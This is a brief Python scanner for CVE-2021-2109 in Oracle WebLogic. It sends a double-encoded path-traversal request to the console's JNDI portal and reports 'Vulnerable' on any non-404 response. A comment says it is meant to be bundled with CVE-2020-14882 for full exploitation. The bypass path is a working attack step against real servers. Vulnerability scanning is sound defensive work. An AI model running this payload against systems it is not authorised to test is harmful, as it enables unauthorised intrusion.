# CVE-2021-2109 Oracle Weblogic scanner
# This should be bundled with CVE-2020-14882 for full exploitation.
# - Nicolas 9/8/2021

import urllib3
import argparse
import requests,sys
requests.packages.urllib3.disable_warnings()

def cve_2021_2109(url):
    url = url.strip()
    url = url + "/console/css/%252e%252e%252f/consolejndi.portal"
    try:
        r = requests.get(url, timeout=50,verify=False)
        print ("Connecting to:", url)
        if (r.status_code != 404):
            print ("Vulnerable")
        else:
            print ("Not Vulnerable")
    except requests.exceptions.RequestException as e:
        raise SystemExit(e)


if __name__ == '__main__':
    try:
        cve_2021_2109(sys.argv[1])
    except:
        print ("python3 weblogic.py" )
